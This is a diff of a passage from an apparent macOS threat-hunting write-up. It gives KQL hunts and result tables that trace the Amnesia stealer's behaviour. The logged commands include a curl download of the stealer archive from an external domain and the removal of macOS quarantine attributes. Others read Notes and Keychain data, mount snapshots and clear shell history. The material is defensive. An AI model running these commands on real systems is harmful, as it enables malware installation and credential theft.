@@ -1586,467 +1586,561 @@ That is fairly normal in threat hunting. The process tree will not always look e
 
 ## Hunting and detection ideas
 
-After reconstructing the sample-specific chain, I wanted to step away from the exact PIDs, filenames and domain used by Amnesia and think about which parts of the activity could be reused as broader macOS hunts. The queries below are intentionally behavioral. Most of the binaries involved are legitimate macOS utilities, so I would not treat a single match as malicious by itself.
+## Behavior Hunting: Rediscovering Amnesia Without the PID
 
-The useful context usually comes from:
+The investigation above relied heavily on PID and PPID relationships to reconstruct Amnesia's activity. That works well once a suspicious process has been identified, but I also wanted to see how much of the same activity could be found without knowing the malware PID beforehand.
 
-- what spawned the process;
-- where the executable or target file is located;
-- whether several related commands occur within a short time window;
-- whether sensitive files are accessed afterwards;
-- and whether the sequence ends in execution, persistence, staging or network activity.
+The following hunts were derived from behaviors observed during the investigation. They are intended as hunting starting points rather than production-ready detections. In a real environment, most would require baselining and tuning.
 
-### `curl` downloading into temporary locations
+---
 
-```text
-event.category : "process"
-and process.name : "curl"
-and process.command_line : *"/tmp/"*
+### Downloading Archives Into `/tmp`
+
+The Amnesia bootstrap used `curl` to retrieve a ZIP archive and write it directly into `/tmp` using a hidden filename.
+
+**Hunting hypothesis:** Command-line downloads of archives directly into temporary directories may indicate payload staging.
+
+```kql
+event.category : "process" and process.executable : "/usr/bin/curl" and process.command_line : */tmp/* and process.command_line : *.zip*
 ```
 
-**What to look for**
+#### Result
 
-The event becomes more interesting when `curl` is downloading an executable, archive or script into `/tmp` or `/private/tmp`, especially when the file is subsequently handled by utilities such as:
+| @timestamp | process.executable | process.command_line | process.parent.command_line |
+|---|---|---|---|
+| Aug 17, 2026 @ 06:49:35.400 | `/usr/bin/curl` | `curl -sL https://debug.allllowef.space/otherassets/macos-hybrid-stealer.zip?t=2def3c01135&b=se -o /tmp/._77002.zip` | `bash` |
+| Aug 17, 2026 @ 06:49:44.928 | `/usr/bin/curl` | `curl -sL https://debug.allllowef.space/otherassets/macos-hybrid-stealer.zip?t=2def3c01135&b=se -o /tmp/._77002.zip` | `bash` |
 
-```text
-unzip
-xattr
-chmod
-codesign
-nohup
-bash
-sh
-```
+Both events show the same behavior: `curl` downloading a ZIP archive into the hidden path `/tmp/._77002.zip`.
 
-I would also review the parent process and destination domain. A temporary or unknown parent process contacting an uncommon external domain is more interesting than a known enterprise updater doing the same thing. 
+This is not malicious by itself. Installers and automation scripts commonly use `curl`. Hidden output paths, unusual external domains, shell parents and subsequent execution make the activity more interesting.
 
-A stronger sequence would look something like:
+Flag combinations such as `-fsSL` or `-fskL` may also appear in malware and adware installers, but should be treated as supporting context rather than indicators on their own.
 
-```text
-curl download
-    ↓
-archive extraction
-    ↓
-xattr / chmod / codesign
-    ↓
-execution
-```
+---
 
-**Common false positives**
+### Hidden Files Under Temporary Directories
 
-Developers, package managers, software installers, update frameworks, MDM tooling and administrative scripts can legitimately use `curl` with `/tmp`.
-
-In an enterprise environment I would use this as a hunting query rather than a standalone detection. The downloaded filename, parent process, destination domain and subsequent file activity provide the context needed to separate normal activity from something worth investigating. On its own, this query is likely to be noisy, so I would correlate matches with the destination domain, parent process and follow-on activity.
-
-### Pipe-to-shell execution
-
-Another useful variation is looking for downloaded content being passed directly into a shell:
+The bootstrap also created dot-prefixed artifacts such as:
 
 ```text
-event.category : "process"
-and process.command_line : *"curl"*
-and (
-  process.command_line : *"| bash"* or
-  process.command_line : *"| sh"*
-)
+/tmp/._77002.zip
+/tmp/.com.apple.dt.77002
 ```
 
-**What to look for**
+Rather than restricting the hunt to ZIP files, we can look more broadly for hidden files beneath temporary directories.
 
-This is more suspicious when the remote content is executed without first being written to a file.
+**Hunting hypothesis:** Hidden files created or modified beneath temporary directories may reveal payload staging, preparation or cleanup.
 
-Useful pivots include:
-
-- the remote domain;
-- the parent shell;
-- child processes created immediately afterwards;
-- newly created files under `/tmp`;
-- and additional `curl` processes spawned by the retrieved script.
-
-**Common false positives**
-
-Some legitimate installation scripts still use patterns such as:
-
-```text
-curl ... | bash
+```kql
+event.category : "file" and file.path : */tmp/.*
 ```
 
-This is common in developer environments and bootstrap installers. The reputation of the source, user context and what the shell does afterwards are therefore important.
+#### Result
 
-### Payload preparation under `/tmp`
+| @timestamp | process.executable | file.path | event.action | event.type |
+|---|---|---|---|---|
+| Aug 17, 2026 @ 06:49:33.047 | `/System/Library/CoreServices/Spotlight.app/Contents/MacOS/Spotlight` | `/Users/jason/Library/Biome/tmp/.tmp.GC5D0Wik` | `modification` | `change` |
+| Aug 17, 2026 @ 06:49:44.925 | `/usr/bin/curl` | `/private/tmp/._77002.zip` | `modification` | `change` |
+| Aug 17, 2026 @ 06:49:45.404 | `/bin/mv` | `/private/tmp/.com.apple.dt.77002` | `rename` | `change` |
+| Aug 17, 2026 @ 06:49:45.581 | `/bin/rm` | `/private/tmp/._77002.zip` | `deletion` | `deletion` |
+| Aug 17, 2026 @ 06:49:45.830 | `/usr/bin/codesign` | `/private/tmp/.com.apple.dt.77002.cstemp` | `modification` | `change` |
+| Aug 17, 2026 @ 06:49:45.838 | `/usr/bin/codesign` | `/private/tmp/.com.apple.dt.77002` | `rename` | `change` |
+| Aug 17, 2026 @ 06:49:47.885 | `/bin/rm` | `/private/tmp/.com.apple.dt.77002` | `deletion` | `deletion` |
 
-Amnesia produced a particularly useful sequence involving several legitimate macOS utilities:
+This hunt also returned legitimate Spotlight/Biome activity, which is useful when considering how the query would need to be baselined in a production environment.
 
-```text
-event.category : "process"
-and process.name : (
-  "xattr" or
-  "chmod" or
-  "codesign" or
-  "nohup"
-)
-and process.command_line : *"/tmp/"*
-```
-
-**What to look for**
-
-The individual utilities are less important than the relationship between them. A newly downloaded binary under `/tmp` being handled by several of these processes within seconds is worth reviewing.
-
-For example:
+The Amnesia events form a much more interesting lifecycle:
 
 ```text
 download
-   ↓
-xattr
-   ↓
-chmod
-   ↓
-codesign
-   ↓
-nohup
-   ↓
-execution
+    ↓
+hidden temporary file
+    ↓
+rename
+    ↓
+code-signing activity
+    ↓
+deletion
 ```
 
-The signal becomes stronger if the same parent process is responsible for most or all of the commands.
+A hidden file alone is weak evidence. Multiple related operations against the same object within seconds are much more useful.
 
-**Common false positives**
+---
 
-Developers, build systems, internal deployment tooling and application installers can legitimately prepare binaries under `/tmp`. A useful enterprise baseline would include expected developer tools, management agents and software installers that routinely use these commands.
+### Quarantine and Extended Attribute Manipulation
 
-### Ad-hoc signing of temporary binaries
-
-A more focused `codesign` hunt is:
+Amnesia used `xattr` against the staged payload:
 
 ```text
-process.name : "codesign"
-and process.command_line : *"--sign -"*
-and process.command_line : *"/tmp/"*
+xattr -cr /tmp/.com.apple.dt.77002
+xattr -d com.apple.quarantine /tmp/.com.apple.dt.77002
 ```
 
-**What to look for**
+`xattr -cr` recursively clears extended attributes, while the second command explicitly deletes `com.apple.quarantine`.
 
-`--sign -` applies an ad-hoc signature.
+**Hunting hypothesis:** Unexpected clearing of extended attributes or removal of `com.apple.quarantine` from recently downloaded files may indicate attempts to interfere with the normal macOS quarantine and Gatekeeper assessment path.
 
-I would investigate cases where an unknown or recently downloaded executable under `/tmp` is ad-hoc signed shortly before execution.
-
-Useful context includes:
-
-- who created the file;
-- whether `chmod +x` occurred first;
-- whether `xattr` was used against the same path;
-- and what process launched the file afterwards.
-
-**Common false positives**
-
-Developers frequently ad-hoc sign test binaries during local development. Build systems, QA tooling and internal packaging workflows can also generate this activity. This becomes much more useful outside known development endpoints or when the parent process is unexpected.
-
-### Quarantine and extended-attribute manipulation
-
-```text
-process.name : "xattr"
-and (
-  process.command_line : *"com.apple.quarantine"* or
-  process.command_line : *"-cr"*
-)
+```kql
+event.category : "process" and process.executable : "/usr/bin/xattr" and (process.command_line : *-cr* or process.command_line : *com.apple.quarantine*)
 ```
 
-**What to look for**
+#### Result
 
-Pay particular attention when `xattr` targets newly downloaded applications, binaries or archives under:
+| @timestamp | process.executable | event.action | process.command_line | process.parent.command_line |
+|---|---|---|---|---|
+| Aug 17, 2026 @ 06:49:45.594 | `/usr/bin/xattr` | `[fork, exec, end]` | `xattr -cr /tmp/.com.apple.dt.77002` | `bash` |
+| Aug 17, 2026 @ 06:51:22.052 | `/usr/bin/xattr` | `[fork, exec, end]` | `xattr -d com.apple.quarantine /tmp/.com.apple.dt.77002` | `/tmp/.com.apple.dt.77002` |
+
+The second event is particularly interesting because the staged payload itself becomes the parent of the command deleting its quarantine attribute.
+
+`xattr` is commonly used by developers and administrators. The target path, parent process and surrounding download/execution activity are therefore important when triaging results.
+
+---
+
+### Ad-Hoc Code Signing
+
+The staged payload was forcibly and recursively ad-hoc signed:
 
 ```text
-/tmp
-/private/tmp
-~/Downloads
+codesign --force --deep --sign - /tmp/.com.apple.dt.77002
 ```
 
-A stronger pattern is:
+**Hunting hypothesis:** Ad-hoc signing of newly created objects beneath temporary or user-writable locations may indicate payload preparation.
 
-```text
-downloaded file
-     ↓
-xattr
-     ↓
-chmod
-     ↓
-codesign
-     ↓
-execution
+```kql
+event.category : "process" and process.executable : "/usr/bin/codesign" and process.command_line : *--force* and process.command_line : *--deep* and process.command_line : *--sign*
 ```
 
-An explicit command such as:
+#### Result
 
-```text
-xattr -d com.apple.quarantine <file>
+| @timestamp | process.executable | event.action | process.command_line | process.parent.command_line |
+|---|---|---|---|---|
+| Aug 17, 2026 @ 06:49:45.751 | `/usr/bin/codesign` | `[fork, exec, end]` | `codesign --force --deep --sign - /tmp/.com.apple.dt.77002` | `bash` |
+
+The `--sign -` argument performs ad-hoc signing. It does not make the application notarized or trusted by Gatekeeper.
+
+Development systems and CI/CD environments may generate significant `codesign` activity. Here, the interesting context is that a hidden object beneath `/tmp` was downloaded, had its extended attributes manipulated and was then ad-hoc signed.
+
+---
+
+### Cleanup and Anti-Forensics
+
+Amnesia removed several temporary artifacts after they were no longer required and also attempted to clear shell history.
+
+**Hunting hypothesis:** Forced deletion of hidden temporary files or attempts to clear shell history may indicate payload cleanup or anti-forensic activity.
+
+```kql
+event.category : "process" and (((process.executable : "/bin/rm") and process.command_line : *-f* and (process.command_line : */tmp/.* or process.command_line : */private/tmp/.*)) or process.command_line : *history -c*)
 ```
 
-is especially worth reviewing when performed by an unknown parent process.
+#### Result
 
-**Common false positives**
+| @timestamp | process.executable | event.action | process.command_line | process.parent.command_line |
+|---|---|---|---|---|
+| Aug 17, 2026 @ 06:49:45.406 | `/bin/rm` | `[fork, exec, end]` | `rm -f /tmp/._77002.zip` | `bash` |
+| Aug 17, 2026 @ 06:49:47.877 | `/bin/rm` | `[fork, exec, end]` | `rm -f /tmp/.com.apple.dt.77002` | `bash` |
+| Aug 17, 2026 @ 06:51:22.014 | `/bin/sh` | `[fork, exec]` | `sh -c history -c 2>/dev/null; true` | `/tmp/.com.apple.dt.77002` |
+| Aug 17, 2026 @ 06:51:22.014 | `/bin/bash` | `[exec, end]` | `sh -c history -c 2>/dev/null; true` | `/tmp/.com.apple.dt.77002` |
 
-Developers and administrators sometimes remove quarantine attributes from internal or unsigned applications. Security testing, software packaging and troubleshooting can also trigger this behavior. The target path and parent process matter more than `xattr` alone. 
+`rm -f` and output redirection to `/dev/null` are extremely common. The stronger signal is the surrounding context: a temporary payload deleting recently created artifacts and spawning a shell to attempt history cleanup.
 
-### Local password validation with `dscl`
+The `history -c` event shows an apparent cleanup attempt, but does not prove that the user's persistent shell-history file was successfully erased.
 
-```text
-process.name : "dscl"
-and process.command_line : *"-authonly"*
+---
+
+### Apple Notes Collection and Staging
+
+Amnesia targeted the Apple Notes SQLite database and its associated WAL and SHM files.
+
+**Hunting hypothesis:** Unexpected command-line utilities reading Apple Notes databases may indicate collection of locally stored Notes data.
+
+```kql
+event.category : "process" and (process.executable : "/bin/cp" or process.executable : "/bin/cat") and (process.command_line : *group.com.apple.notes* or process.command_line : *NoteStore.sqlite*)
 ```
 
-**What to look for**
+#### Process Result
 
-`dscl -authonly` validates a username and password against the local account database.
+| @timestamp | process.executable | event.action | process.command_line | process.parent.command_line |
+|---|---|---|---|---|
+| Aug 17, 2026 @ 06:50:31.652 | `/bin/cat` | `[fork, exec, end]` | `cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` | `sh -c cat '/Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite' 2>/dev/null` |
+| Aug 17, 2026 @ 06:50:31.921 | `/bin/cat` | `[fork, exec, end]` | `cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` | `sudo -S cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` |
+| Aug 17, 2026 @ 06:50:31.962 | `/bin/cat` | `[fork, exec, end]` | `cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm` | `sh -c cat '/Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm' 2>/dev/null` |
+| Aug 17, 2026 @ 06:50:32.019 | `/bin/cat` | `[fork, exec, end]` | `cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm` | `sudo -S cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm` |
+| Aug 17, 2026 @ 06:50:32.084 | `/bin/cat` | `[fork, exec, end]` | `cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal` | `sh -c cat '/Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal' 2>/dev/null` |
+| Aug 17, 2026 @ 06:50:32.116 | `/bin/cat` | `[fork, exec, end]` | `cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal` | `sudo -S cat /Users/jason/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal` |
 
-It becomes much more interesting when spawned by:
+The hunt shows all three SQLite components being read. The WAL file is particularly relevant because recent database changes may not yet exist only in the primary SQLite database.
 
-- an unknown application;
-- a hidden executable;
-- a process running from `/tmp`;
-- or something that has just displayed a password prompt.
+A follow-up file hunt looked for related Notes artifacts:
 
-I would also look for follow-on activity such as:
-
-```text
-sudo -S
-security unlock-keychain
-login.keychain-db access
+```kql
+event.category : "file" and file.path : *NoteStore*
 ```
 
-If a password appears directly in the command line, that is another important clue.
+#### File Result
 
-**Common false positives**
+| @timestamp | event.type | process.executable | process.parent.pid | process.pid | file.path |
+|---|---|---|---:|---:|---|
+| Aug 17, 2026 @ 06:50:31.948 | `deletion` | `/private/tmp/.com.apple.dt.77002` | `14486` | `14499` | `/private/tmp/_notes_tmp_NoteStore.sqlite` |
+| Aug 17, 2026 @ 06:50:32.077 | `deletion` | `/private/tmp/.com.apple.dt.77002` | `14486` | `14499` | `/private/tmp/_notes_tmp_NoteStore.sqlite-shm` |
+| Aug 17, 2026 @ 06:50:32.131 | `deletion` | `/private/tmp/.com.apple.dt.77002` | `14486` | `14499` | `/private/tmp/_notes_tmp_NoteStore.sqlite-wal` |
 
-IT support utilities, enrollment workflows, account-management scripts and enterprise tooling can legitimately validate local credentials. The parent executable and subsequent privileged actions are the most useful ways to distinguish them.
+The file telemetry did not provide the original read/open event against the Notes database, but it independently exposed temporary staged copies being deleted.
 
-### Keychain unlocking from the command line
-
-```text
-event.category : "process"
-and process.name : "security"
-and process.command_line : *"unlock-keychain"*
-```
-
-**What to look for**
-
-The event becomes much more interesting when:
-
-- a password is passed directly with `-p`;
-- the target is `login.keychain-db`;
-- the parent is an unknown executable;
-- or the process originates from `/tmp`.
-
-I would correlate this with file access to:
+Together, the two telemetry sources give us:
 
 ```text
-~/Library/Keychains/login.keychain-db
-```
-
-and any browser Safe Storage or credential collection activity around the same time.
-
-**Common false positives**
-
-Developer build pipelines, signing workflows, CI systems and automation may legitimately unlock Keychains from the command line. The target Keychain, account, parent process and whether a plaintext password is exposed in the command line are important context.
-
-### Direct access to credential and user-data stores
-
-File telemetry provides another hunting surface:
-
-```text
-event.category : "file"
-and (
-  file.path : *"login.keychain-db"* or
-  file.path : *"Login Data"* or
-  file.path : *"Cookies"* or
-  file.path : *"NoteStore.sqlite"*
-) and (event.type : "access" or event.type : "change")
-```
-
-**What to look for**
-
-Focus on the process performing the access. Typically, you would whitelist browsers that are accessing browser related data. 
-
-For example:
-
-```text
-Safari reading Safari data
-```
-
-is expected.
-
-A hidden executable under `/private/tmp` reading:
-
-```text
-login.keychain-db
-NoteStore.sqlite
-browser credential databases
-```
-
-is very different.
-
-The event is also more interesting if the same process later creates a staging directory or archive.
-
-**Common false positives**
-
-Browsers, backup software, indexing services, migration utilities, password managers and security software may legitimately access these files. Allowlisting known processes is likely necessary in larger environments.
-
-### APFS snapshot creation and mounting
-
-The `tmutil` and `mount_apfs` sequence was one of the more unusual behaviors in the dataset:
-
-```text
-event.category : "process"
-and (
-  process.name : "tmutil" or
-  process.name : "mount_apfs"
-)
-```
-
-A more focused version is:
-
-```text
-process.name : "mount_apfs"
-and process.command_line : *"-s"*
-and process.command_line : *"/tmp/"*
-```
-
-**What to look for**
-
-A sequence like this is worth investigating:
-
-```text
-tmutil localsnapshot
-        ↓
-sudo -S mount_apfs -s <snapshot>
-        ↓
-snapshot mounted under /tmp
-```
-
-The signal becomes stronger when:
-
-- the mount point is hidden, such as `.snap_*`;
-- `-o nobrowse` is used;
-- the parent is an unknown executable;
-- or the mounted snapshot is followed by access to browser, Notes, Keychain or other protected data.
-
-**Common false positives**
-
-Backup products, forensic tools, administrators and troubleshooting utilities may legitimately interact with APFS snapshots. This should still be a relatively low-volume behavior in many enterprise environments, but it needs contextual validation before being treated as malicious.
-
-### Temporary collection and archive creation
-
-```text
-event.category : "process"
-and process.name : (
-  "ditto" or
-  "zip" or
-  "tar"
-)
-and process.command_line : *"/tmp/"*
-```
-
-For `ditto`, a more focused hunt is:
-
-```text
-process.name : "ditto"
-and process.command_line : *"-c"*
-and process.command_line : *"-k"*
-and process.command_line : *"/tmp/"*
-```
-
-**What to look for**
-
-Look for archives created from temporary directories shortly after:
-
-- Keychain access;
-- browser credential access;
-- Notes access;
-- file collection;
-- or host enumeration.
-
-A useful sequence is:
-
-```text
-sensitive data access
-      ↓
-staging under /tmp
-      ↓
-archive creation
-      ↓
-network activity
-      ↓
+Notes database read
+    ↓
+SQLite + WAL + SHM collection
+    ↓
+temporary staging
+    ↓
 cleanup
 ```
 
-Randomly named staging directories are also useful context.
+---
 
-**Common false positives**
+### Host and System Discovery
 
-Installers, software update frameworks, packaging systems, development tools and support scripts frequently create archives under `/tmp`. The source directory contents, parent process and immediate follow-on network activity are what make the event more interesting.
+Amnesia profiles the infected Mac using native utilities such as `ioreg`, `sw_vers` and `system_profiler`.
 
-### LaunchDaemon and LaunchAgent writes
+**Hunting hypothesis:** Rapid execution of several native macOS discovery utilities under the same unusual parent may indicate automated host profiling.
 
-A broad persistence hunt is:
-
-```text
-event.category : "file" and (
-  file.path : "/Library/LaunchDaemons/*" or
-  file.path : "/Library/LaunchAgents/*" or
-  file.path : "/Users/*/Library/LaunchAgents/*"
-)
+```kql
+event.category : "process" and (process.executable : "/usr/sbin/ioreg" or process.executable : "/usr/bin/sw_vers" or process.executable : "/usr/sbin/system_profiler" or (((process.executable : "/bin/sh" or process.executable : "/bin/bash" or process.executable : "/bin/zsh")) and (process.command_line : *ioreg* or process.command_line : *sw_vers* or process.command_line : *system_profiler*)))
 ```
 
-**What to look for**
+#### Result
 
-The plist itself is only part of the story.
+The hunt returned activity for `ioreg`, `sw_vers` and `system_profiler` within the same discovery window.
 
-I would inspect:
+One of the visible `system_profiler` events was:
 
-- the process writing the plist;
-- its parent process;
-- the plist `Label`;
-- `ProgramArguments`;
-- whether the target executable lives in `/tmp`, `/private/tmp`, Downloads or another user-writable directory;
-- and whether `launchctl` is used immediately afterwards.
+| @timestamp | process.executable | event.action | process.command_line | process.parent.command_line |
+|---|---|---|---|---|
+| Aug 17, 2026 @ 06:49:58.631 | `/usr/sbin/system_profiler` | `[fork, exec, end]` | `/usr/sbin/system_profiler -nospawn -xml SPSoftwareDataType -detailLevel full` | `system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType` |
 
-A suspicious sequence might look like:
+These utilities are normal on macOS. The more useful signal is several discovery commands appearing within seconds under the same unexpected execution chain.
 
-```text
-unknown executable
-       ↓
-sudo
-       ↓
-cp <plist> /Library/LaunchDaemons/
-       ↓
-launchctl bootstrap
+MDM platforms, inventory agents, troubleshooting tools and administrative scripts are likely sources of legitimate noise.
+
+---
+
+### Password Validation With `dscl`
+
+Amnesia prompted the user for their login password and then validated the supplied credential locally using `dscl`.
+
+A related hunt for AppleScript-based credential prompts was also tested:
+
+```kql
+event.category : "process" and process.executable : "/usr/bin/osascript" and process.command_line : *display dialog*
 ```
 
-**Common false positives**
+**Result: No matching events.**
 
-This query can be noisy in managed macOS environments. MDM platforms, EDR agents, VPN software, backup clients, enterprise applications and legitimate installers commonly create LaunchAgents and LaunchDaemons. An allowlist of expected labels, signing identities and installation paths will make this much more useful.
+This does not mean no credential prompt occurred. In this execution, Amnesia used a native prompt rather than spawning `osascript`.
 
-### LaunchDaemon registration with `launchctl`
+The follow-up credential-validation behavior was visible:
 
-```text
-process.name : "launchctl"
-and process.command_line : *"bootstrap"*
+**Hunting hypothesis:** Unexpected use of `dscl -authonly` may indicate programmatic validation of a captured local password.
+
+```kql
+event.category : "process" and process.executable : "/usr/bin/dscl" and process.command_line : *authonly*
 ```
 
-**What to look for**
+#### Result
 
-Focus on what is being bootstrapped and what spawned `launchctl`.
+| @timestamp | process.executable | event.action | process.command_line | process.parent.command_line |
+|---|---|---|---|---|
+| Aug 17, 2026 @ 06:49:52.592 | `/usr/bin/dscl` | `[exec, end]` | `dscl /Local/Default -authonly jason <redacted>` | `/tmp/.com.apple.dt.77002` |
 
-A job loading from:
+The supplied password appeared directly inside process command-line telemetry and has therefore been redacted.
 
-```text
-/Library/LaunchDaemons/
+Unexpected applications using `dscl -authonly`, especially when the parent originates from a temporary location, are worth investigating.
+
+---
+
+### Keychain Unlocking and Direct Access
+
+After obtaining and validating the password, Amnesia attempted to unlock the user's login Keychain.
+
+**Hunting hypothesis:** Unexpected use of `security unlock-keychain`, particularly with a password passed through `-p`, may indicate programmatic credential access.
+
+```kql
+event.category : "process" and process.executable : "/usr/bin/security" and process.command_line : *unlock-keychain*
 ```
 
-is not suspicious by itself. A job whose `ProgramArguments` points to a hidden executable under `/tmp`, especially when `launchctl` was spawned by that same executable, is much more concerning.
+#### Result
 
-**Common false positives**
+| @timestamp | process.executable | event.action | process.command_line | process.parent.command_line |
+|---|---|---|---|---|
+| Aug 17, 2026 @ 06:51:17.419 | `/usr/bin/security` | `[fork, exec, end]` | `security unlock-keychain -p <redacted> /Users/jason/Library/Keychains/login.keychain-db` | `/tmp/.com.apple.dt.77002` |
 
-Installers, MDM tools, security software and legitimate administration frequently use `launchctl bootstrap`. The plist contents and process ancestry are essential context.
+Again, the supplied password was visible in the process command line and has been redacted.
+
+The next hunt looked for processes other than `/usr/bin/security` directly accessing the login Keychain database:
+
+```kql
+event.category : "file" and file.path : *login.keychain* and event.type : "access" and not process.executable : "/usr/bin/security"
+```
+
+#### Direct Keychain Access
+
+The hunt returned 25 access events. The first visible events were:
+
+| @timestamp | event.type | process.executable | process.parent.pid | process.pid | file.path |
+|---|---|---|---:|---:|---|
+| Aug 17, 2026 @ 06:49:53.122 | `access` | `/private/tmp/.com.apple.dt.77002` | `14486` | `14499` | `/Users/jason/Library/Keychains/login.keychain-db` |
+| Aug 17, 2026 @ 06:49:53.427 | `access` | `/private/tmp/.com.apple.dt.77002` | `14486` | `14499` | `/Users/jason/Library/Keychains/login.keychain-db` |
+| Aug 17, 2026 @ 06:49:53.728 | `access` | `/private/tmp/.com.apple.dt.77002` | `14486` | `14499` | `/Users/jason/Library/Keychains/login.keychain-db` |
+| Aug 17, 2026 @ 06:49:54.035 | `access` | `/private/tmp/.com.apple.dt.77002` | `14486` | `14499` | `/Users/jason/Library/Keychains/login.keychain-db` |
+| Aug 17, 2026 @ 06:49:54.336 | `access` | `/private/tmp/.com.apple.dt.77002` | `14486` | `14499` | `/Users/jason/Library/Keychains/login.keychain-db` |
+| Aug 17, 2026 @ 06:49:54.642 | `access` | `/private/tmp/.com.apple.dt.77002` | `14486` | `14499` | `/Users/jason/Library/Keychains/login.keychain-db` |
+
+This gives us a useful behavioral chain:
+
+```text
+password captured
+    ↓
+dscl -authonly
+    ↓
+security unlock-keychain
+    ↓
+direct login.keychain-db access
+```
+
+Direct Keychain access can occur legitimately through password managers, migration tools and forensic software. The unusual temporary executable and surrounding credential activity make this sequence more significant.
+
+---
+
+### Chromium Database Access
+
+Chromium-based browsers maintain valuable databases and configuration files such as:
+
+```text
+Login Data
+Cookies
+History
+Web Data
+Local State
+```
+
+**Hunting hypothesis:** Unexpected processes accessing multiple Chromium profile databases may indicate credential, cookie or browser-session collection.
+
+```kql
+event.category : "file" and event.type : "access" and (file.path : *Login\ Data* or file.path : *Cookies* or file.path : *History* or file.path : *Web\ Data* or file.path : *Local\ State*) and not process.executable : "/System/Volumes/Preboot/Cryptexes/Incoming/OS/System/Library/Frameworks/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.Networking.xpc/Contents/MacOS/com.apple.WebKit.Networking"
+```
+
+The WebKit Networking process above generated legitimate access noise during testing and was excluded.
+
+In a real environment, additional baselining would likely be needed for legitimate browsers, browser helpers, backup products and security tooling.
+
+One access to `History` or `Cookies` is not necessarily meaningful. Multiple browser databases accessed rapidly by the same unusual process are much more interesting, particularly when followed by staging or archive creation.
+
+---
+
+### Archive Creation With `ditto`
+
+After collecting data, Amnesia used the native `ditto` utility to create a PKZip archive.
+
+**Hunting hypothesis:** Archive creation using `ditto` shortly after collection activity may indicate staging for exfiltration.
+
+```kql
+event.category : "process" and process.executable : "/usr/bin/ditto" and process.command_line : *-c* and process.command_line : *-k*
+```
+
+#### Result
+
+| @timestamp | process.executable | event.action | process.command_line | process.parent.command_line | process.pid | process.parent.pid |
+|---|---|---|---|---|---:|---:|
+| Aug 17, 2026 @ 06:51:17.954 | `/usr/bin/ditto` | `[fork, exec, end]` | `ditto -c -k --sequesterRsrc /tmp/.com.apple.dt.77002 /tmp/dUvV2FVcZkOrcH80s4nOdw2fL ...` | `/tmp/.com.apple.dt.77002` | `14710` | `14499` |
+
+The Amnesia payload itself is the parent of `ditto`.
+
+`ditto` is widely used legitimately on macOS. The useful context here is the sequence of data collection, temporary staging and archive creation.
+
+---
+
+### LaunchDaemon Persistence
+
+Amnesia also attempted persistence using a LaunchDaemon.
+
+**Hunting hypothesis:** Unexpected creation of property lists under `/Library/LaunchDaemons` may indicate persistence, particularly when written by processes outside normal installers or management tooling.
+
+```kql
+event.category : "file" and file.path : /Library/LaunchDaemons/*.plist
+```
+
+LaunchDaemons are widely used by legitimate software, security products and MDM tooling.
+
+For any result, the important pivots are:
+
+- process responsible for creating the plist
+- `Program` or `ProgramArguments`
+- executable location
+- ownership and permissions
+- related `launchctl` activity
+- whether the referenced executable resides in a temporary or user-writable location
+
+The earlier investigation established the Amnesia-related LaunchDaemon activity, but no separate result table was captured during this behavioral-hunting pass.
+
+---
+
+### APFS Snapshot Mounting
+
+The malware also attempted a TCC bypass by mounting an APFS local snapshot.
+
+**Hunting hypothesis:** Unexpected APFS snapshot mounting may indicate attempts to reach protected data through an alternate filesystem view.
+
+```kql
+event.category : "process" and process.executable : "/System/Library/Filesystems/apfs.fs/Contents/Resources/mount_apfs" and process.command_line : *-s*
+```
+
+#### Result
+
+| @timestamp | process.executable | event.action | process.command_line | process.parent.command_line | process.pid | process.parent.pid |
+|---|---|---|---|---|---:|---:|
+| Aug 17, 2026 @ 06:50:38.837 | `/System/Library/Filesystems/apfs.fs/Contents/Resources/mount_apfs` | `[fork, exec, end]` | `mount_apfs -o nobrowse -s com.apple.TimeMachine.2026-08-17-065038.local ...` | `sudo -S mount_apfs -o nobrowse -s com.apple.TimeMachine.2026...` | `14622` | `14621` |
+| Aug 17, 2026 @ 06:51:14.227 | `/System/Library/Filesystems/apfs.fs/Contents/Resources/mount_apfs` | `[fork, exec, end]` | `mount_apfs -o nobrowse -s com.apple.TimeMachine.2026-08-17-065112.local ...` | `sudo -S mount_apfs -o nobrowse -s com.apple.TimeMachine.2026...` | `14682` | `14681` |
+
+The `...` values above reflect where the Kibana view itself truncated the command line.
+
+Snapshot mounting is not malicious by itself. The suspicious context would be an unexpected process creating or mounting snapshots and subsequently accessing protected browser or user data.
+
+In this execution, the attempted technique did not establish a successful TCC bypass on macOS 26.
+
+---
+
+### Hunts That Returned No Results
+
+Not every useful hunting hypothesis should return a malicious event.
+
+Several additional behaviors were tested against the dataset.
+
+#### System Audio Muting
+
+Some macOS stealers have used AppleScript to mute system audio before performing other activity.
+
+```kql
+event.category : "process" and process.executable : "/usr/bin/osascript" and process.command_line : *set volume with output muted*
+```
+
+**Result: No matching events.**
+
+---
+
+#### Telegram `tdata` Collection
+
+Telegram Desktop data can be valuable to information stealers.
+
+```kql
+event.category : "process" and (process.executable : "/bin/cp" or process.executable : "/bin/cat") and process.command_line : *tdata*
+```
+
+**Result: No matching events.**
+
+This only tests for collection through external utilities such as `cp` or `cat`. Direct file access by the malware itself would not necessarily appear in this query.
+
+---
+
+#### AppleScript Credential Prompt
+
+A common macOS malware technique is to generate fake system-style credential dialogs through AppleScript.
+
+```kql
+event.category : "process" and process.executable : "/usr/bin/osascript" and process.command_line : *display dialog*
+```
+
+**Result: No matching events.**
+
+Amnesia used a native password prompt in this execution instead, demonstrating why the absence of a particular utility does not prove that the broader behavior did not occur.
+
+---
+
+#### Headless Chromium Session Control
+
+The stream functionality described for Amnesia can clone a browser profile and launch Chromium headlessly for remote session control.
+
+A useful behavioral starting point is to look for browsers enabling both headless execution and Chrome DevTools Protocol access:
+
